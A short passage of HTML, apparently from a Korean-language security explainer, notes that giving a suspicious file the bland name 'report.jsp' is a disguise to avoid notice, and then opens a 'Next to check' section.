 </span></code></pre></div>
 <p>파일 이름을 <code>report.jsp</code>(보고서)처럼 평범하게 지은 것도 눈에 덜 띄려는 위장입니다.</p>
 <p><strong>다음으로 확인할 것:</strong></p>
